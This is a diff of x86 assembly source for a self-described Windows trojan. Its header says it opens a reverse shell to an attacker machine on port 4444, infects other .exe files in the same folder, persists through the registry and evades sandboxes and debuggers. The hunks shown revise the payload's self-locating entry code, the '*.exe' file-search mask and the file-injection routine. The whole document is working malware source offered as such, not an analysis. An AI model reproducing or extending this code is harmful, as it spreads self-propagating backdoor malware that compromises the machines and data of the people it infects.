@@ -1,13 +1,13 @@
 ;--------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 202)
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 201)
 ; Version: 2.5
 ; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
 ; It can also add itself to the registry key and alters its behaviour when it detects sandboxes and debuggers
 ; The injected file can also infect other files in the directory while avoiding inject to the infected files.
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1233 bytes
+; Size: 1223 bytes
 ;--------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -16,23 +16,22 @@ Option CaseMap:None
 .Code
 start:
 payload:
-	Call get_eip
+	Jmp get_payload_addr
 
 get_eip:
 	Pop Ebx
-	delta = $ -payload
-	Xor Ecx, Ecx
-	Inc Ebx
-	Sub Bl, delta					; Point ebx back to the entry point of the payload
+	Jmp next
 
-	Mov Ch, 4H
+get_payload_addr:
+	Call get_eip
+
+next:
+	Xor Ecx, Ecx
+	delta = $ -payload
+	Sub Bl, delta					; Point ebx back to the entry point of the payload
+	Add Bl, 2H
+	Mov Ch, 4H					; Allocate the buffer size on the stack (0x400)
 	Sub Esp, Ecx
-	Xor Eax, Eax
-	Lea Edi, [Ebp - 4H]
-	Mov Ch, 1H
-	Std
-	Rep Stosd
-	Cld
 	Jmp check
 
 hash_api:
@@ -351,7 +350,7 @@ copy_loop:
 
 	Add Ebx, Eax
 	Mov DWord Ptr [Ebx], 78652E2AH			; "*.ex"
-	Mov Word Ptr [Ebx + 4H], 065H			; "e"
+	Mov Byte Ptr [Ebx + 4H], 65H			; "e"
 
 	Lea Eax, [Ebp - 400H]
 	Push Eax
@@ -425,7 +424,6 @@ found_backslash:
 InjectingFile:
 	Xor Ecx, Ecx
 	Xor Eax, Eax
-	Xor Edx, Edx
 	Lea Eax, [Ebp - 200H]
 	Push Ecx					; hTemplatefile (NULL)
 	Push Ecx					; dwFlagsAndAttributes (NULL)
